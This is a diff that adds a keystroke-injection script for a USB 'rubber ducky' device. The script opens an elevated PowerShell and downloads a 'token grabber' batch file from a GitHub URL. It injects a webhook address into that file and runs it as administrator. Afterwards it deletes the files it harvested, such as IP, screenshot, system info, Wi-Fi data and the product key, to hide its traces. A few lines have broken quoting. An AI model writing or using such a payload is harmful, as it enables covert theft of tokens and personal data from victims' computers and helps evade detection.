@@ -1,0 +1,127 @@
+REM Author: D00MTrooper
+REM Description:
+DELAY 750
+WINDOWS d
+DELAY 1500
+WINDOWS r
+DELAY 1500
+STRING powershell
+ENTER
+DELAY 750
+LEFTARROW
+ENTER
+DELAY 1200
+STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/D00MTrooper/grabber/main/tokken_grabbber2.bat" -OutFile "$env:TEMP\GRABBER.bat"
+ENTER
+DELAY 3000
+STRING $filePath = "$env:TEMP\GRABBER.bat"
+ENTER
+DELAY 500
+STRING $existingContent = Get-Content -Path $filePath
+ENTER
+DELAY 500
+STRING $newLines = @('@echo off', 'set webhook=WEBHOOK)
+ENTER
+DELAY 500
+STRING $newContent = $newLines + $existingContent
+ENTER
+DELAY 500
+STRING $newContent | Set-Content -Path $filePath
+ENTER
+DELAY 300
+STRING $WScriptShell = New-Object -ComObject WScript.Shell
+DELAY 300
+ENTER
+DELAY 300
+STRING $Shortcut = $WScriptShell.CreateShortcut("$env:TEMP\MyShortcut.lnk")
+DELAY 1500
+ENTER
+DELAY 300
+STRING $Shortcut.TargetPath = "$env:TEMP\GRABBER.bat"
+DELAY 750
+ENTER
+DELAY 300
+STRING $Shortcut.Save()
+DELAY 750
+ENTER
+DELAY 300
+STRING Start-Sleep -Seconds 1
+DELAY 750
+ENTER
+DELAY 300
+STRING $link = (New-Object -ComObject WScript.Shell).CreateShortcut("$env:TEMP\MyShortcut.lnk")
+DELAY 2000
+ENTER
+DELAY 300
+STRING $target = $link.TargetPath
+DELAY 750
+ENTER
+DELAY 300
+STRING Start-Process -FilePath $target -Verb runAs
+DELAY 750
+ENTER
+DELAY 1750
+LEFTARROW
+DELAY 750
+ENTER
+DELAY 750
+DELAY 40000
+STRING Remove-Item -Path "$env:TEMP\GRABBER.bat" -Force
+DELAY 750
+ENTER
+DELAY 300
+STRING Remove-Item -Path "$env:TEMP\ip.txt" -Force
+DELAY 750
+ENTER
+DELAY 300
+STRING Remove-Item -Path "$env:TEMP\ipp.txt" -Force
+DELAY 750
+ENTER
+DELAY 300
+STRING Remove-Item -Path "$env:TEMP\%username%_Capture.jpg" -Force
+DELAY 750
+ENTER
+DELAY 300
+STRING Remove-Item -Path "$env:TEMP\sysi.txt" -Force
+DELAY 750
+ENTER
+DELAY 300
+STRING Remove-Item -Path "$env:TEMP\System_INFO.txt" -Force
+DELAY 750
+ENTER
+DELAY 300
+STRING Remove-Item -Path "$env:TEMP\netstat.txt" -Force
+DELAY 750
+ENTER
+DELAY 300
+STRING Remove-Item -Path "$env:TEMP\test.ps1 -Force
+DELAY 750
+ENTER
+DELAY 300
+STRING Remove-Item -Path "$env:TEMP\programms.txt " -Force
+DELAY 750
+ENTER
+DELAY 300
+STRING Remove-Item -Path "$env:TEMP\uuid.txt" -Force
+DELAY 750
+ENTER
+DELAY 300
+STRING Remove-Item -Path "$env:TEMP\testtttt.ps1" -Force
+DELAY 750
+ENTER
+DELAY 300
+STRING Remove-Item -Path "$env:TEMP\wlan.txt" -Force
+DELAY 750
+ENTER
+DELAY 300
+STRING Remove-Item -Path "$env:TEMP\key.vbs" -Force
+DELAY 750
+ENTER
+DELAY 300
+STRING Remove-Item -Path "$env:TEMP\Productkey.txt" -Force
+DELAY 750
+ENTER
+STRING Remove-Item -Path "$env:TEMP\MyShortcut.lnk" -Force
+DELAY 750
+ENTER
+DELAY 300
